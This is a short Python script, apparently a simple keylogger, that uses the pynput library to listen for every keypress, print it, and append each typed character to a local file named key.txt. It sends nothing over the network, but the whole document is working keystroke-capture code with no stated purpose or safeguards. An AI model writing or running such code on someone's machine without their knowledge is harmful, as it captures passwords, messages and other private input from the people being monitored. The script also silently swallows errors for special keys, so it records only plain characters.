from pynput import keyboard

def keysPressed(key):
    print(str(key))
    with open("key.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error char")
            
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keysPressed)
    listener.start()
    input()